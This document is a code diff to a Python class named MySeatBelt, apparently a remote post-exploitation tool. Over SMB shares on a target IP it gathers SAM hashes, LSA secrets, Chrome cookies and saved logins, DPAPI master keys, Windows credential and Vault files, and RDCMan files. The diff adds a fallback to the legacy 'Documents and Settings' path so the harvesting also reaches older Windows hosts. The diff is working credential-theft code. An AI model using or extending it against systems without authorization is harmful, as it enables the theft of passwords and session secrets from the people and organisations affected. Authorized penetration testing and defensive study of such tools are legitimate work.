@@ -76,6 +76,7 @@ class MySeatBelt:
 		self.__SAMHashes = None
 		self.__LSASecrets = None
 		self.global_logfile = b'globallog.log'
+		self.user_directory = 'Users'
 		self.init_connect()
 		#logger.init()
 
@@ -384,9 +385,9 @@ class MySeatBelt:
 		# Parse chrome
 		# autres navigateurs ?
 
-		user_directories = [("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data", 'Local State', 'ChromeLocalState', 'DOMAIN'),
-							("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Cookies', 'ChromeCookies', 'DOMAIN'),
-							("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Login Data', 'ChromeLoginData', 'DOMAIN'),
+		user_directories = [(self.user_directory + "\\{username}\\AppData\\Local\\Google\\Chrome\\User Data", 'Local State', 'ChromeLocalState', 'DOMAIN'),
+							(self.user_directory + "\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Cookies', 'ChromeCookies', 'DOMAIN'),
+							(self.user_directory + "\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Login Data', 'ChromeLoginData', 'DOMAIN')
 							]
 
 
@@ -667,15 +668,15 @@ class MySeatBelt:
 		#CredHistory
 		#Appdata Roaming ?
 
-		user_directories = [("Users\\{username}\\AppData\\Local\\Microsoft\\Credentials",'*','credential','DOMAIN'),
+		user_directories = [(self.user_directory + "\\{username}\\AppData\\Local\\Microsoft\\Credentials",'*','credential','DOMAIN'),
 							("Windows\\ServiceProfiles\\ADSync\\AppData\\Local\\Microsoft\\Credentials", '*', 'credential', 'MACHINE-USER'),
-							("Users\\{username}\\AppData\\Roaming\\Microsoft\\Credentials", '*', 'credential','DOMAIN'),
-							("Users\\{username}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings","*.rdg",'rdg','DOMAIN')
+							(self.user_directory + "\\{username}\\AppData\\Roaming\\Microsoft\\Credentials", '*', 'credential','DOMAIN'),
+							(self.user_directory + "\\{username}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings","*.rdg",'rdg','DOMAIN')
 							]#ADD Desktop for RDG
 		machine_directories = [("Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials",'*','credential','MACHINE'),
 							   ("Windows\\ServiceProfiles\\ADSync\\AppData\\Local\\Microsoft\\Credentials", '*',
 							   'credential', 'MACHINE-USER'),
-							   ("Users\\ADSync\\AppData\\Local\\Microsoft\\Credentials", '*', 'credential', 'MACHINE-USER'),
+							   (self.user_directory + "\\ADSync\\AppData\\Local\\Microsoft\\Credentials", '*', 'credential', 'MACHINE-USER')
 							   #Valider le %systemdir% selon la version de windows ?
 							]
 
@@ -846,7 +847,7 @@ class MySeatBelt:
 		#autres navigateurs ?
 		#CredHistory
 
-		user_directories = [("Users\\{username}\\AppData\\Local\\Microsoft\\Vault", '*', 'vault','DOMAIN')]
+		user_directories = [(self.user_directory + "\\{username}\\AppData\\Local\\Microsoft\\Vault", '*', 'vault','DOMAIN')]
 		machine_directories = [("ProgramData\\Microsoft\\Vault",'*','vault','MACHINE'),
 							   ("Windows\\system32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault\\",'*','vault','MACHINE')] #Windows hello pincode
 
@@ -1357,6 +1358,10 @@ class MySeatBelt:
 			self.myfileops.do_use('C$')
 			#self.myfileops.pwd = 'Users'
 			completion=self.myfileops.do_ls('Users','*', display=False)
+			if len(completion) == 0:
+				self.logging.debug(f"[{self.options.target_ip}] Users path is empty, using alternate legacy path \"Documents and Settings\"")
+				completion=self.myfileops.do_ls('Documents and Settings','*', display=False)
+				self.user_directory = 'Documents and Settings'
 			for infos in completion:
 				longname, is_directory = infos
 				if is_directory and longname not in blacklist:
@@ -1374,6 +1379,10 @@ class MySeatBelt:
 				self.myfileops.do_use(share)
 				#self.pwd = 'Users'
 				completion=self.myfileops.do_ls('Users','*', display=False)
+				if len(completion) == 0:
+					self.logging.debug(f"[{self.options.target_ip}] Users path is empty, using alternate legacy path \"Documents and Settings\"")
+					completion=self.myfileops.do_ls('Documents and Settings','*', display=False)
+					self.user_directory = 'Documents and Settings'
 				for infos in completion:
 					longname, is_directory = infos
 					if is_directory and longname not in blacklist:
@@ -1402,7 +1411,7 @@ class MySeatBelt:
 		for user in self.users:
 			if user.username != 'MACHINE$':
 				try:
-					tmp_pwd = ntpath.join(ntpath.join('Users', user.username),'AppData\\Roaming\\Microsoft\\Protect')
+					tmp_pwd = ntpath.join(ntpath.join(self.user_directory, user.username),'AppData\\Roaming\\Microsoft\\Protect')
 					self.logging.debug(f"[{self.options.target_ip}] Looking for {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey in %s" % tmp_pwd)
 					my_directory = self.myfileops.do_ls(tmp_pwd,'', display=True)
 					for infos in my_directory:
